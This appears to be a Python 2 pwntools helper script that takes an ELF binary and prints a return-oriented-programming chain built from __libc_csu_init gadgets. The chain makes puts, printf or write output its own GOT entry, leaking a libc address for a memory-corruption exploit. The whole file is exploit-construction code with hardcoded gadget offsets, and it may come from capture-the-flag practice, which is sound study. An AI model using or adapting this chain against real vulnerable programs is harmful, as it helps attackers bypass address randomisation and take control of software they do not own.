from pwn import *
import sys

binary = ELF(sys.argv[1])

gadget1 = binary.symbols["__libc_csu_init"] + (0x400530 - 0x40054A)
gadget2 = binary.symbols["__libc_csu_init"] + (0x400530 - 0x4004F0)

if "puts" in binary.got:
    #r12 = puts@plt
    #rbx = 0
    #r15d = puts@got
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0x%x) # r12 [puts@plt]" % binary.symbols["puts"]
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    print "rop += p64(0x%x) # r15 [puts@got]" % binary.got["puts"]
    print "rop += p64(0x%x) # gadget 2" % gadget2
elif "printf" in binary.got:
    #r12 = printf@plt
    #rbx = 0
    #r15d = printf@got
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0x%x) # r12 [printf@plt]" % binary.symbols["printf"]
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
    print "rop += p64(0x%x) # gadget 2" % gadget2
elif "write" in binary.got:
    #r12 = write@plt
    #rbx = 0
    #r15d = 1
    #r14 = write@got
    #r13 = 8
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0x%x) # r12 [write@plt]" % binary.symbols["write"]
    print "rop += p64(8) # r13 [sizeof void*]"
    print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
    print "rop += p64(1) # r15 [stdout]"
    print "rop += p64(0x%x) # gadget 2" % gadget2



